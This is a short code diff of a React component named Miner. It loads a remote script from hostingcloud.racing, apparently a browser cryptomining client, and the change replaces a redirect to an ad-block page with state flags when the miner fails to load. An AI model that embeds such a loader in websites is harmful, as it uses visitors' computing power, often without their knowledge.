@@ -11,7 +11,7 @@ class Miner extends Component {
   }
 
   setupMiner = () => {
-    const { setIsMinerReady } = this.props;
+    const { setIsMinerReady, setIsAdblocked } = this.props;
 
     if (typeof window === 'undefined' || typeof document === 'undefined') {
       return null;
@@ -19,7 +19,8 @@ class Miner extends Component {
 
     scriptjs('//hostingcloud.racing/KcRw.js', () => {
       if (!window.Client) {
-        navigate('/ad-block');
+        setIsAdblocked && setIsAdblocked(true);
+        setIsMinerReady && setIsMinerReady(true);
       } else if (window.location.pathname.match(/ad-block/gm)) {
         navigate('/');
       }
